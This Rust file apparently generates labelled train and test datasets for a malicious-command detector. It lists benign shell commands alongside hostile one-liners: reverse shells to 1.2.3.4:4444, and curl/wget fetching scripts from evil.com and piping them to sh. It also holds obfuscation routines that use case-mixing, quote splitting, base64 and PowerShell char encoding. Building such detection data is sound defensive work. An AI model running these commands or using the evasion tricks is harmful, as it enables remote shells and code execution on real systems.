use rand::seq::SliceRandom;
use rand::Rng;
use serde::{Serialize, Deserialize};

#[derive(Serialize, Deserialize, Clone)]
pub struct Command {
    pub text: String,
    pub label: u8,
}

/* ---------------- BENIGN + MALICIOUS ---------------- */

fn generate_benign(n: usize) -> Vec<Command> {
    let base_cmds = vec![
        "ls -la","cd /var/www","cat file.txt","echo hello",
        "mkdir test","rm temp.txt","touch new.txt",
        "pwd","whoami","df -h","top","ps aux",
        "nano file.txt","vim file.txt"
    ];

    let mut rng = rand::thread_rng();

    (0..n).map(|_| {
        let cmd = base_cmds.choose(&mut rng).unwrap().to_string();
        Command { text: cmd, label: 0 }
    }).collect()
}

fn generate_malicious(n: usize) -> Vec<Command> {
    let base_cmds = vec![
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        "nc -e /bin/sh 1.2.3.4 4444",
        "curl http://evil.com/shell.sh | sh",
        "wget http://evil.com/payload.sh -O- | sh",
        "powershell -enc PAYLOAD"
    ];

    let mut rng = rand::thread_rng();

    (0..n).map(|_| {
        let cmd = base_cmds.choose(&mut rng).unwrap().to_string();
        Command { text: cmd, label: 1 }
    }).collect()
}

/* ---------------- TRAIN OBFUSCATION ---------------- */

fn random_case(s: &str) -> String {
    let mut rng = rand::thread_rng();
    s.chars()
        .map(|c| if rng.gen_bool(0.5) { c.to_ascii_uppercase() } else { c })
        .collect()
}

fn split_string(s: &str) -> String {
    s.replace("powershell", "po\"wer\"shell")
     .replace("bash", "ba\"sh\"")
}

fn fake_base64(s: &str) -> String {
    format!("echo {} | base64 -d | sh", s)
}

fn obfuscate_train(cmd: &str) -> String {
    let mut rng = rand::thread_rng();
    let mut out = cmd.to_string();

    if rng.gen_bool(0.5) { out = random_case(&out); }
    if rng.gen_bool(0.3) { out = split_string(&out); }
    if rng.gen_bool(0.3) { out = fake_base64(&out); }

    out
}

/* ---------------- TEST OBFUSCATION ---------------- */

fn concat_obfuscation(s: &str) -> String {
    if s.contains("powershell") {
        s.replace("powershell", r#""po"+"wershell""#)
    } else {
        s.to_string()
    }
}

fn char_encode_obfuscation(s: &str) -> String {
    s.chars()
        .map(|c| format!("[char]{}", c as u32))
        .collect::<Vec<String>>()
        .join("+")
}

fn variable_obfuscation(s: &str) -> String {
    format!("$a=\"{}\"; iex $a", s)
}

fn obfuscate_test(cmd: &str) -> String {
    let mut rng = rand::thread_rng();

    let methods = vec![
        concat_obfuscation,
        char_encode_obfuscation,
        variable_obfuscation,
    ];

    let method = methods.choose(&mut rng).unwrap();
    method(cmd)
}

/* ---------------- EXPANSION ---------------- */

fn expand_train(cmds: Vec<Command>) -> Vec<Command> {
    let mut out = vec![];

    for c in cmds {
        out.push(c.clone());
        for _ in 0..2 {
            out.push(Command {
                text: obfuscate_train(&c.text),
                label: 1,
            });
        }
    }

    out
}

fn expand_test(cmds: Vec<Command>) -> Vec<Command> {
    cmds.into_iter()
        .map(|c| Command {
            text: obfuscate_test(&c.text),
            label: 1,
        })
        .collect()
}

/* ---------------- MAIN GENERATOR ---------------- */

pub fn generate_datasets() {
    let benign_train = generate_benign(200);
    let benign_test = generate_benign(100);

    let malicious_base = generate_malicious(150);

    let malicious_train = expand_train(malicious_base.clone());
    let malicious_test = expand_test(malicious_base);

    let mut train = vec![];
    train.extend(benign_train);
    train.extend(malicious_train);

    let mut test = vec![];
    test.extend(benign_test);
    test.extend(malicious_test);

    std::fs::write(
        "train.json",
        serde_json::to_string_pretty(&train).unwrap()
    ).unwrap();

    std::fs::write(
        "test.json",
        serde_json::to_string_pretty(&test).unwrap()
    ).unwrap();

    println!("Train: {}, Test: {}", train.len(), test.len());
}
